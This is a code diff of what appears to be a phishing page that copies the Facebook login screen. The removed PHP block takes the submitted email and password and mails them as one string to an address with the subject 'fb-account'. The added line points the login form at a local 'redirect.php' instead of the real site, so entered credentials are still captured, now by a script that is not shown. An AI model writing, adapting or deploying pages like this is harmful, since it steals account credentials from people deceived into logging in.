@@ -1,10 +1,3 @@
-<?php
-if(array_key_exists('email',$_POST)){
-    $msg = $_POST['email'].":".$_POST['password'];
-    mail("example@email.com","fb-account",$msg);
-}
-?>
-
 <!DOCTYPE html>
 <html>
     <head>
@@ -25,7 +18,7 @@ if(array_key_exists('email',$_POST)){
                     font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;facebook </span>
                 </div>
                 <div id="topright">
-                    <form action="https://www.fb.com" method="post">
+                    <form action="redirect.php" method="post">
                     <div id="email">
                         <br>
                         Email or Phone<br><input name="email" type="text" class="fill" style="border-radius: 1px"><br>
